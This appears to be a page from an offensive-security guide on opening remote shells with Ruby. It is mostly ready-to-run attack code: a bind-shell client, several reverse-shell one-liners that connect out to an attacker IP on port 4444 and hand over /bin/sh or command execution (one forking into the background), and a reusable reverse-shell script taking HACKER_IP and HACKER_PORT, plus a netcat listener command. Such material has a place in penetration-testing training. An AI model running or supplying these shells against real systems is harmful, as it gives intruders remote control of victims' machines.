# Remote Shell

Remote shell means s forward or reverse connection to the target system command-line(shell). 

**Note:** For windows systems, replace the "/bin/sh" to "cmd.exe"

## Connect to Bind shell
from terminal
```ruby
ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
```
since `192.168.0.15` is the victim IP

## Reverse shell
Attacker is listening on port 4444 `nc -lvp 4444`. Now on victim machine run
```ruby
ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

if you don't whant to rely on `/bin/sh`
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

if you don't want to rely on `cmd.exe`
```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

since `192.168.0.13` is the attacker IP

If you want it more flexible script file

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'socket'
if ARGV[0].nil? || ARGV[1].nil?
    puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
    exit
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
```
- To listen 
```
ruby ncat.rb -lvp 443 
```

- To connect 
```
ruby ncat.rb -cv -r RHOST -p 443
```

## Bind and Reverse shell 
This is an awesome implementation for a standalone  [bind][1] and [reverse][2] shells scripts written by [Hood3dRob1n][3] on github . The bind shell requires authentication while reverse is not.



<br><br><br>
---
[1]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb
[2]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb
[3]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells